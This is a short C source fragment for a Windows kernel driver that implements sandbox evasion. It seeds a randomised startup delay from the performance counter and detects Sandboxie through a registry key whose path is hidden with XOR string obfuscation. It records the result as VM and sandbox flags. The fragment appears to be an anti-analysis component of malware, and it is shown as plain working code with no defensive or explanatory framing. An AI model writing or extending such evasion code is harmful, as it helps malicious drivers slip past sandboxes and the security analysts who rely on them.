#include "evasion_kernel.h"
#include "XorStr.h"
#include <intrin.h>
VOID KeInitializeEvasion(PEVASION_CONTEXT c){
    UNICODE_STRING fn;RtlInitUnicodeString(&fn,L"KeQueryPerformanceCounter");
    typedef LARGE_INTEGER(NTAPI*PFN_KQPC)(PLARGE_INTEGER);
    PFN_KQPC pKQPC=(PFN_KQPC)MmGetSystemRoutineAddress(&fn);
    ULONG seed=pKQPC?pKQPC(NULL).LowPart:0x12345678;
    BOOLEAN sb=CheckSandbox();c->delay_ms=500+(seed%1500);c->is_vm=sb;c->is_sandbox=sb;}
BOOLEAN CheckSandbox(){UNICODE_STRING r;RtlInitUnicodeString(&r,XOR_W(L"\\Registry\\Machine\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Sandboxie"));OBJECT_ATTRIBUTES oa;InitializeObjectAttributes(&oa,&r,OBJ_CASE_INSENSITIVE,NULL,NULL);HANDLE h;if(NT_SUCCESS(ZwOpenKey(&h,KEY_READ,&oa))){ZwClose(h);return TRUE;}return FALSE;}
